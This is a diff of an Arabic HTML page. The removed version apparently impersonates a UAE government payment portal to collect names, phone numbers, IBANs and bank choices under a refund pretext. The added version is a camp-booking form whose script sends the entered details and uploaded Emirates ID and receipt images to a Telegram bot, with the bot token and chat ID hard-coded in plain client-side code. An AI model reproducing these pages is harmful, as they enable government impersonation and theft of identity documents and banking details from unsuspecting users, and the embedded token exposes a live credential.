@@ -2,86 +2,158 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>بوابة دفع قيمة الخدمات الإلكترونية</title>
-
-  <!-- Open Graph Meta Tags -->
-  <meta property="og:title" content="بوابة دفع قيمة الخدمات الإلكترونية">
-  <meta property="og:description" content="خدمة دفع إلكترونية موحدة — حكومة الإمارات العربية المتحدة (تجريبية)">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://example.netlify.app/">
-  <meta property="og:image" content="https://tonfree.serv00.net/sadUae/index-files/og-uae-1200x630.jpg">
-  <meta property="og:image:width" content="1200">
-  <meta property="og:image:height" content="630">
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="بوابة دفع قيمة الخدمات الإلكترونية">
-  <meta name="twitter:description" content="خدمة دفع إلكترونية موحدة — حكومة الإمارات العربية المتحدة (تجريبية)">
-  <meta name="twitter:image" content="https://tonfree.serv00.net/sadUae/index-files/og-uae-1200x630.jpg">
-  <link rel="icon" href="https://tonfree.serv00.net/sadUae/index-files/government-ae-logo-arabic.png">
-
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>اعتماد الحجز</title>
   <style>
-    body{font-family:Tahoma,Arial;background:#fff;margin:0}
-    header{text-align:center;padding:20px}
-    header img{height:80px}
-    main{padding:20px}
-    form{max-width:420px;margin:auto;background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 8px rgba(0,0,0,.12)}
-    label{display:block;margin-top:14px;font-weight:700}
-    input,select,button{width:100%;padding:12px;margin-top:6px;border:1px solid #ccc;border-radius:6px;box-sizing:border-box}
-    button{background:#0b5320;color:#fff;border:0;font-weight:800;cursor:pointer}
-    button:hover{background:#094418}
-    footer{background:#000;color:#fff;padding:18px 20px;margin-top:30px;font-size:13px}
-    .red-text { color: red; margin-top: 8px; font-weight: bold; }
+    *{box-sizing:border-box}
+    body{font-family:Tahoma,Arial;background:#f2f2f2;margin:0;padding:12px}
+    .container{max-width:900px;margin:auto}
+    .card{background:#fff;border-radius:14px;padding:18px;box-shadow:0 4px 14px rgba(0,0,0,.08)}
+    h2{text-align:center;margin:0 0 14px}
+    label{display:block;margin-top:10px;font-weight:600}
+    input{width:100%;padding:10px;border:1px solid #ccc;border-radius:8px;margin-top:4px;font-size:15px}
+    .row{display:flex;gap:10px;flex-wrap:wrap}
+    .col{flex:1 1 48%}
+    button{width:100%;margin-top:18px;padding:14px;border:none;border-radius:12px;font-size:17px;background:#198754;color:#fff;cursor:pointer}
+    button:hover{opacity:.9}
+    .confirm{display:none;text-align:center;padding:40px}
+    .check{width:120px;height:120px;border-radius:50%;background:#198754;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;color:#fff;font-size:64px}
+    .invoiceNo{font-size:20px;font-weight:bold}
+    @media (max-width:600px){.col{flex:1 1 100%}}
   </style>
 </head>
+
 <body>
-  <header>
-    <img src="https://tonfree.serv00.net/sadUae/index-files/government-ae-logo-arabic.png" alt="شعار الإمارات">
-    <div class="red-text">قيمة هذه العملية: 7 دراهم</div>
-    <h2>بوابة دفع قيمة الخدمات الإلكترونية</h2>
-    <p>حكومة الإمارات العربية المتحدة</p>
-  </header>
+<div class="container">
 
-  <main>
-    <form id="mainForm" autocomplete="off">
-      <label for="fullName">الاسم بالكامل *</label>
-      <input id="fullName" required>
+<div id="formPage" class="card">
+<h2>نموذج اعتماد الحجز</h2>
 
-      <label for="mobile">رقم الجوال *</label>
-      <input id="mobile" type="tel" placeholder="05XXXXXXXX" required>
+<label>اسم الزبون</label>
+<input id="customer" />
 
-      <label for="iban">رقم الآيبان *</label>
-      <input id="iban" type="text" placeholder="رقم الآيبان" required>
+<label>صورة الهوية الإماراتية</label>
+<input id="idImage" type="file" accept="image/*" />
 
-      <label for="bank">ادخل البنك الخاص بك *</label>
-      <select id="bank" required>
-        <option value="">— اختر البنك —</option>
-        <option>بنك أبوظبي الأول</option>
-        <option>بنك أبوظبي التجاري</option>
-        <option>مصرف أبوظبي الإسلامي</option>
-        <option>بنك الإمارات دبي الوطني</option>
-      </select>
+<label>ساعة الدخول</label>
+<input id="checkin" type="time" />
 
-      <label for="amount">ادخل المبلغ الذي تود استرجاعه *</label>
-      <input id="amount" type="number" min="1" step="0.01" placeholder="مثال: 1.00" required>
+<div class="row">
+  <div class="col">
+    <label>اليوم</label>
+    <input id="day" />
+  </div>
+  <div class="col">
+    <label>التاريخ</label>
+    <input id="date" type="date" />
+  </div>
+</div>
 
-      <label for="invoiceNumber">رقم المفوتر *</label>
-      <input id="invoiceNumber" type="text" inputmode="numeric" maxlength="6" required>
+<div class="row">
+  <div class="col">
+    <label>اسم المخيم</label>
+    <input id="camp" />
+  </div>
+  <div class="col">
+    <label>رقم المخيم</label>
+    <input id="campNo" />
+  </div>
+</div>
 
-      <button type="submit">التالي</button>
-    </form>
-  </main>
+<label>عدد الأشخاص</label>
+<input id="people" type="number" />
 
-  <footer>© حكومة الإمارات 2025</footer>
+<label>رقم التواصل 1</label>
+<input id="phone1" />
 
-  <script>
-    document.getElementById('mainForm').addEventListener('submit', function(e){
-      e.preventDefault();
-      const amount = document.getElementById('amount').value.trim();
-      if (parseFloat(amount || '0') < 1) { alert('المبلغ يجب أن يكون على الأقل درهم واحد'); return; }
-      const invoice = document.getElementById('invoiceNumber').value.trim();
-      if (invoice.length > 6 || !/^[0-9]*$/.test(invoice)) { alert('رقم المفوتر يجب أن يكون رقم ولا يتجاوز 6 أرقام'); return; }
-      window.location.href = 'pay.html';
-    });
-  </script>
+<label>رقم التواصل 2</label>
+<input id="phone2" />
+
+<label>ساعة الخروج</label>
+<input id="checkout" type="time" />
+
+<label>تاريخ الخروج</label>
+<input id="outDate" type="date" />
+
+<label>صورة إيصال الحوالة</label>
+<input id="receipt" type="file" accept="image/*" />
+
+<label>المبلغ المتفق عليه</label>
+<input id="total" type="number" />
+
+<label>المبلغ المدفوع</label>
+<input id="paid" type="number" oninput="calcRemain()" />
+
+<label>باقي المبلغ</label>
+<input id="remain" readonly />
+
+<button onclick="confirmBooking()">تأكيد الحجز</button>
+</div>
+
+<div id="confirmPage" class="card confirm">
+  <div class="check">✓</div>
+  <div>تم تأكيد الحجز بنجاح</div>
+  <div class="invoiceNo">رقم الفاتورة: <span id="inv"></span></div>
+</div>
+
+</div>
+
+<script>
+const BOT_TOKEN = "8528188278:AAGVc4oOzJjpOgIe6tWwCpQlY5CsAdCRrzk";
+const CHAT_ID = "8404960059";
+
+function calcRemain(){
+  const t = Number(total.value||0);
+  const p = Number(paid.value||0);
+  remain.value = t - p;
+}
+
+async function confirmBooking(){
+
+  const message = `
+📌 اعتماد حجز جديد
+
+👤 اسم الزبون: ${customer.value}
+📅 اليوم: ${day.value}
+📆 التاريخ: ${date.value}
+⛺ اسم المخيم: ${camp.value}
+🔢 رقم المخيم: ${campNo.value}
+👥 عدد الأشخاص: ${people.value}
+📞 رقم التواصل 1: ${phone1.value}
+📞 رقم التواصل 2: ${phone2.value}
+🕒 ساعة الدخول: ${checkin.value}
+🕘 ساعة الخروج: ${checkout.value}
+📆 تاريخ الخروج: ${outDate.value}
+💰 المبلغ الكلي: ${total.value}
+💵 المدفوع: ${paid.value}
+💳 المتبقي: ${remain.value}
+`;
+
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:CHAT_ID,text:message})
+  });
+
+  const files = document.querySelectorAll('input[type="file"]');
+  for(const fileInput of files){
+    if(fileInput.files.length > 0){
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("document", fileInput.files[0]);
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,{
+        method:"POST",
+        body:formData
+      });
+    }
+  }
+
+  inv.innerText = "INV-" + Date.now();
+  formPage.style.display = "none";
+  confirmPage.style.display = "block";
+}
+</script>
+
 </body>
 </html>
